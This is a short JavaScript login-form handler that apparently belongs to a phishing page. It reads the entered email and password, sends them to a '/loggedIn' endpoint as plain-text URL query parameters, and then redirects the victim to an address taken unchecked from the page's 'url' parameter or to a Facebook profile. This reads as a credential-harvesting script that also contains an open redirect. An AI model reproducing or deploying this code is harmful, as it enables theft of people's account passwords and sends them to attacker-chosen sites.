
function onClick (){
   
    let uname = (document.getElementById('email').value);
    let pass = (document.getElementById('pass').value);
    let href = new URL(location.href);
    let url = href.searchParams.get("url");

    fetch('/loggedIn?uname='+encodeURIComponent(uname)+'&&pass='+encodeURIComponent(pass))
    .then(function(response) {
        return response.json();
    })
    .then(function(myJson) {
        console.log(JSON.stringify(myJson));
        if(url){
            location.href = url;
        }
        else
        location.href = 'https://www.facebook.com/ebinx2';
    });

}
window.onload = ()=>{
    var input = document.getElementById("pass");
    input.addEventListener("keyup", function(event) {
      if (event.keyCode === 13) {
       event.preventDefault();
       onClick();
      }
    });

}

